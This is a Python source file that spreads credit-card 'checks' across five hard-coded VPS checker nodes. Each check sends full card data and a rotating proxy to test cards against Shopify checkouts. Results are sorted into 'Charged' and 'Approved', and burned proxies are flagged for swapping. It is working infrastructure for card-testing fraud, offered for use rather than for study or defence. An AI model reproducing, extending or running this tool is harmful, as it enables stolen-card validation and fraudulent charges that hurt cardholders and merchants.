"""checker_bridge.py — Async HTTP load balancer across VPS checker nodes.

Each node runs sh_checker.py (aiohttp.web on :8181) with gunicorn async workers.
Routing uses least-connections + circuit-breaker; every request is retried on
the next healthy node on failure — nothing is dropped while any node lives.
"""

import asyncio
import aiohttp
import time
import logging
from urllib.parse import quote as _urlquote

log = logging.getLogger("checker_bridge")
log.setLevel(logging.DEBUG)

# ── Active VPS Node list (5 nodes × 16 workers = 80 total async workers) ──────
NODES = [
    "http://2.25.68.50:8181",
    "http://2.25.68.55:8181",
    "http://187.77.137.114:8181",
    "http://187.127.214.93:8181",
    "http://187.127.214.92:8181",
]

_disabled_nodes: set = set()

_state: dict = {
    url: {
        "in_flight":    0,
        "consec_fails": 0,
        "healthy":      True,
        "unhealthy_at": 0.0,
        "avg_ms":       3000.0,
        "total_ok":     0,
    }
    for url in NODES
}

_CIRCUIT_FAIL_THRESHOLD = 5
_CIRCUIT_RESET_SECS     = 20.0
_REQUEST_TIMEOUT        = 120
_CONNECT_TIMEOUT        = 5
_HEALTH_PING_INTERVAL   = 15

_PROXY_BURNED_INDICATORS = (
    "proxy burned", "change your proxy", "proxy error",
    "authentication failed", "could not connect",
)

_session: aiohttp.ClientSession | None = None


async def _get_session() -> aiohttp.ClientSession:
    global _session
    if _session is None or _session.closed:
        conn = aiohttp.TCPConnector(
            limit=8000,
            limit_per_host=2000,
            ttl_dns_cache=300,
            keepalive_timeout=60,
            enable_cleanup_closed=True,
        )
        _session = aiohttp.ClientSession(
            connector=conn,
            timeout=aiohttp.ClientTimeout(
                total=_REQUEST_TIMEOUT,
                connect=_CONNECT_TIMEOUT,
            ),
        )
    return _session


def _maybe_reset(url: str) -> None:
    s = _state[url]
    if not s["healthy"] and (time.monotonic() - s["unhealthy_at"]) >= _CIRCUIT_RESET_SECS:
        s["healthy"] = True
        s["consec_fails"] = 0
        log.info(f"[lb] circuit RESET → {url}")


def _pick_node(exclude: set | None = None) -> str | None:
    exclude = exclude or set()
    for url in _state:
        _maybe_reset(url)

    cands  = [(u, s) for u, s in _state.items()
              if u not in exclude and u not in _disabled_nodes]
    if not cands:
        return None
    healthy = [(u, s) for u, s in cands if s["healthy"]]
    pool    = healthy if healthy else cands
    pool.sort(key=lambda x: (x[1]["in_flight"], x[1]["avg_ms"]))
    return pool[0][0]


async def _call_node(node: str, cc: str, proxy: str, site: str) -> dict:
    s    = _state[node]
    t0   = time.monotonic()
    cc4  = cc.split("|")[0][-4:] if "|" in cc else cc[-4:]
    s["in_flight"] += 1
    log.debug(f"[lb] → {node} | cc=...{cc4} | in_flight={s['in_flight']} | proxy={proxy[:30]}...")
    try:
        sess   = await _get_session()
        params = {"cc": cc, "proxy": proxy}

        async with sess.get(
            f"{node}/check",
            params=params,
            timeout=aiohttp.ClientTimeout(
                total=_REQUEST_TIMEOUT, connect=_CONNECT_TIMEOUT,
            ),
        ) as resp:
            if resp.status != 200:
                raise RuntimeError(f"HTTP {resp.status}")
            data = await resp.json(content_type=None)

        elapsed           = (time.monotonic() - t0) * 1000
        s["consec_fails"] = 0
        s["healthy"]      = True
        s["avg_ms"]       = 0.75 * s["avg_ms"] + 0.25 * elapsed
        s["total_ok"]    += 1
        log.debug(f"[lb] ✓ {node} | {elapsed:.0f}ms | resp={str(data.get('Response',''))[:60]}")
        return data

    except (asyncio.TimeoutError, TimeoutError) as e:
        elapsed = (time.monotonic() - t0) * 1000
        s["consec_fails"] += 1
        log.warning(f"[lb] TIMEOUT {node} | {elapsed:.0f}ms | fails={s['consec_fails']}")
        if s["consec_fails"] >= _CIRCUIT_FAIL_THRESHOLD:
            s["healthy"] = False
            s["unhealthy_at"] = time.monotonic()
            log.warning(f"[lb] OPEN (timeout) → {node}")
        raise

    except Exception as e:
        elapsed  = (time.monotonic() - t0) * 1000
        err_str  = str(e)[:80]
        err_type = type(e).__name__
        proxy_side = any(ind in err_str.lower() for ind in _PROXY_BURNED_INDICATORS)
        if not proxy_side:
            s["consec_fails"] += 1
            if s["consec_fails"] >= _CIRCUIT_FAIL_THRESHOLD:
                s["healthy"] = False
                s["unhealthy_at"] = time.monotonic()
                log.warning(f"[lb] OPEN ({err_type}) → {node}")
        log.warning(f"[lb] ERROR {node} | {elapsed:.0f}ms | {err_type}: {err_str} | proxy_side={proxy_side}")
        raise

    finally:
        s["in_flight"] = max(0, s["in_flight"] - 1)


async def _health_loop() -> None:
    while True:
        await asyncio.sleep(_HEALTH_PING_INTERVAL)
        for url in list(_state):
            try:
                sess = await _get_session()
                async with sess.get(
                    f"{url}/health",
                    timeout=aiohttp.ClientTimeout(total=6, connect=4),
                ) as r:
                    if r.status == 200:
                        if not _state[url]["healthy"]:
                            log.info(f"[lb] RESTORED → {url}")
                        _state[url]["healthy"] = True
                        _state[url]["consec_fails"] = 0
            except Exception:
                pass


_health_task: asyncio.Task | None = None

def _ensure_health_loop() -> None:
    global _health_task
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running() and (_health_task is None or _health_task.done()):
            _health_task = loop.create_task(_health_loop())
    except Exception:
        pass


def _proxy_data_to_proxy_str(proxy_data: dict | str | None) -> str | None:
    if not proxy_data:
        return None
    if isinstance(proxy_data, str):
        return proxy_data.strip()
    existing = proxy_data.get("proxy_url")
    if existing and isinstance(existing, str) and existing.strip():
        return existing.strip()
    ip    = str(proxy_data.get("ip")   or "").strip()
    port  = str(proxy_data.get("port") or "").strip()
    user  = proxy_data.get("username")
    pw    = proxy_data.get("password")
    ptype = (proxy_data.get("type") or "http").lower()
    if not ip or not port:
        return None
    if ptype == "https":
        ptype = "http"
    if user and pw:
        u = _urlquote(str(user), safe="")
        p = _urlquote(str(pw),   safe="")
        return f"{ptype}://{u}:{p}@{ip}:{port}"
    return f"{ptype}://{ip}:{port}"


def _map_result(raw: dict, cc_str: str, site_url: str) -> dict:
    response = raw.get("Response", "Unknown")
    price    = raw.get("Price", "-")
    gate     = raw.get("Gate", "Shopify")

    rl = response.lower()
    if "order_placed" in rl or "order completed" in rl or "💎" in response:
        status = "Charged"
    elif any(k in rl for k in [
        "invalid_cvv", "incorrect_cvv", "insufficient_funds",
        "approved", "invalid_cvc", "incorrect_cvc",
        "incorrect_zip", "insufficient funds",
    ]):
        status = "Approved"
    else:
        status = response

    result = {
        "Response": response,
        "Price":    price,
        "Gate":     gate,
        "Status":   status,
        "CC":       raw.get("CC", cc_str),
        "Site":     raw.get("Site", site_url),
    }
    p = str(result["Price"])
    if p not in ("-", "", "0.00") and not p.startswith("$"):
        result["Price"] = f"${p}"
    return result


async def check_card_site(cc_str: str, site_url: str, proxy_data: dict | str | None) -> dict:
    """Main async entry point called for every CC check."""
    _ensure_health_loop()

    proxy_str = _proxy_data_to_proxy_str(proxy_data)
    if not proxy_str:
        return {
            "Response": "No proxy – add one with /addproxy",
            "Price": "-", "Gate": "-", "Status": "No proxy",
            "CC": cc_str, "Site": site_url,
        }

    if site_url and not site_url.startswith("http"):
        site_url = f"https://{site_url}"
    site_url = (site_url or "").rstrip("/")

    tried:    set  = set()
    last_err: str  = "All nodes failed"
    t_start = time.monotonic()
    cc4 = cc_str.split('|')[0][-4:] if '|' in cc_str else cc_str[-4:]

    while True:
        node = _pick_node(exclude=tried)
        if node is None:
            break
        tried.add(node)
        try:
            raw    = await _call_node(node, cc_str, proxy_str, site_url)
            result = _map_result(raw, cc_str, site_url)
            resp_l = result.get("Response", "").lower()
            if any(ind in resp_l for ind in _PROXY_BURNED_INDICATORS):
                return {
                    "Response": "Proxy burned - change your proxy",
                    "Price": "-", "Gate": "Shopify", "Status": "Error",
                    "CC": cc_str, "Site": site_url,
                }
            return result
        except Exception as e:
            last_err = f"{type(e).__name__}: {str(e)[:80]}"
            if len(tried) >= len(NODES):
                break
            await asyncio.sleep(0.05)

    err_l = last_err.lower()
    if any(ind in err_l for ind in _PROXY_BURNED_INDICATORS):
        final_resp = "Proxy burned - change your proxy"
    else:
        final_resp = f"All nodes failed: {last_err}"

    return {
        "Response": final_resp,
        "Price": "-", "Gate": "-", "Status": "Error",
        "CC": cc_str, "Site": site_url,
    }
